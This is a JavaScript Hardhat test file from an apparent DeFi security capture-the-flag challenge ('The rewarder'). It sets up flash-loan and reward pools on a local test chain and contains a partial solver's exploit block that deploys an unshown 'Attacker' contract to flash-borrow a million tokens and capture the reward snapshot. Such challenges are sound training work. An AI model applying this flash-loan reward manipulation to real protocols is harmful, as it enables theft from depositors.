const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }



        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
        // lastSnapshotIdForRewards;
        // uint256 public lastRecordedSnapshotTimestamp;
        const res = await this.rewarderPool.lastSnapshotIdForRewards();
        console.log("TEST LAST SNAPSHOT: " ,res.toNumber())
    });



    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

 // Advance time 5 days so that depositors can get rewards

 const Attacker = await ethers.getContractFactory('Attacker', attacker);

 // (address liquidityTokenAddress
 // ,address _flashLoanPool
 // ,address _rewardPool
 // ,address _rewardToken
 console.log("ATTACKER: " , attacker.address)

 this.attackercontract = await Attacker.deploy(
     this.liquidityToken.address,this.flashLoanPool.address,this.rewarderPool.address,this.rewardToken.address,attacker.address
 );
 await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

 await this.attackercontract.attack(ethers.utils.parseEther('1000000'))


 await this.rewarderPool.distributeRewards()

 //**** ohh so after the evm time has been increased like this, will need to trigger the snapshot by depositing or calling distribute rewards.
 //that will at least push the roundnumber up */
 const res = await this.rewarderPool.lastSnapshotIdForRewards();
 console.log("TEST LAST SNAPSHOT2: " ,res.toNumber())

 let rewards = await this.rewardToken.balanceOf(this.attackercontract.address);
 console.log("rewards: " , ethers.utils.formatEther(rewards))

 //await this.token.approve(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 //await this.token.connect().transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
 //this.rewardToken.connect(this.attackercontract.address).transfer(attacker,ethers.utils.parseEther('1000000'))

    });



    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);
                console.log("other user rewards: ", ethers.utils.formatEther(rewards))
            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });
});
